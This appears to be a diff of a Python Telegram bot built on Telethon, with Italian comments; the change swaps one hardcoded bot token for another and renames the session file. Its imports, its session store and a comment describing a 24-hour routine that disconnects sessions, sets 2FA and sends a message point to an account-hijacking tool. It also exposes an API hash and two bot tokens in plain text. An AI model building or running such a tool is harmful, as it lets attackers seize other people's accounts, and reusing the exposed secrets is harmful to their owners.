@@ -7,14 +7,14 @@ from telethon import TelegramClient, events, Button
 from telethon.tl.functions.auth import ResetAuthorizationsRequest
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError, AuthRestartError
 
-# --- EVENT LOOP ESPLICITO (EVITA ERRORE SU PYTHON 3.14) ---
+# --- EVENT LOOP ESPLICITO ---
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
 # --- CREDENZIALI CONFIGURATE ---
 API_ID = 37810956
 API_HASH = "7753910251b42b5f91abe65c34f7f712"
-BOT_TOKEN = "9141462955:AAEY0YM2Wh7IhrBwXYeSClQZR1_3j_gZNLk"
+BOT_TOKEN = "8854040084:AAFsVQCtNgGJL-lDlS-wpW2G1aP8i_I2HRU"
 ADMIN_ID = 8886429641
 
 SESSION_DIR = "user_sessions"
@@ -37,7 +37,7 @@ def run_web():
 threading.Thread(target=run_web, daemon=True).start()
 
 # Avvio del bot principale con Telethon
-bot = TelegramClient('bot_session_v2', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
+bot = TelegramClient('bot_session_v3', API_ID, API_HASH, loop=loop).start(bot_token=BOT_TOKEN)
 
 # --- MOTORE IN BACKGROUND (ATTESA 24H -> DISCONNESSIONE SESSIONI -> 2FA -> MESSAGGIO) ---
 async def background_workers():
